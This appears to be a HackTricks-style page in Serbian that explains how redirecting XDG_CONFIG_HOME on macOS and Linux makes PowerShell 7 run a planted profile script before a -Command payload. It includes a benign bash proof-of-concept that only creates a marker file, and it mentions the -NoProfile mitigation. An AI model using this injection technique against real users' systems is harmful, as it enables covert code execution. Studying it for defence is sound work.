# macOS PowerShell Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `XDG_CONFIG_HOME` i PowerShell profiles

Na macOS-u i Linux-u, PowerShell koristi XDG konfiguracione putanje i izvršava korisničke profile skripte kada se `pwsh` pokrene. Preusmeravanje promenljive `XDG_CONFIG_HOME` menja direktorijum koji sadrži `powershell/profile.ps1` i skriptu specifičnu za console host `powershell/Microsoft.PowerShell_profile.ps1`; kontrolisana datoteka na toj lokaciji stoga može da se izvrši pre `-Command` payload-a.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```
Ovo se odnosi na PowerShell 6+ (`pwsh`) na platformama koje nisu Windows; Windows PowerShell koristi drugačije lokacije za profile. `pwsh -NoProfile` sprečava učitavanje profila. Takođe proverite `HOME` i nazive profila specifične za host, jer drugi PowerShell hostovi mogu izabrati drugačije skripte.

## References

- [1] [PowerShell promenljive okruženja i XDG putanje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [PowerShell profili](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
{{#include ../../../banners/hacktricks-training.md}}
